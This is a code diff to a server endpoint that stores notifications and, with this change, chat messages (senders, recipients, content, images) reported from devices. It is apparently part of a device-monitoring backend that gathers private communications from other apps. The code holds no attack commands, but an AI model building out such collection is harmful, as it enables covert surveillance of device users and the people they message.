@@ -499,10 +499,27 @@ def report_bulk():
             db.session.add(SocialNotification(
                 device_id=canonical, package_name=notif.get('package_name', ''),
                 app_name=notif.get('app_name', ''), sender=notif.get('sender', ''),
-                content=notif.get('content', ''),
-                message_type=notif.get('message_type', 'notification'),
+                content=notif.get('content', ''), message_type=notif.get('message_type', 'notification'),
                 timestamp=notif.get('timestamp', _now_ms()),
             ))
+
+    if 'chat_messages' in data:
+        from ..models import ChatMessage
+        for msg in data['chat_messages']:
+            msg_id = msg.get('id')
+            if not (msg_id and ChatMessage.query.filter_by(id=msg_id).first()):
+                db.session.add(ChatMessage(
+                    id=msg_id,
+                    chat_id=msg.get('chat_id', ''),
+                    sender_id=msg.get('sender_id', ''),
+                    sender_name=msg.get('sender_name', ''),
+                    recipient_id=msg.get('recipient_id', ''),
+                    recipient_name=msg.get('recipient_name', ''),
+                    content=msg.get('content', ''),
+                    type=msg.get('type', 'text'),
+                    image_url=msg.get('image_url'),
+                    timestamp=msg.get('timestamp', _now_ms())
+                ))
 
     db.session.commit()
     _emit(canonical, 'heartbeat', {'timestamp': _now_ms()})
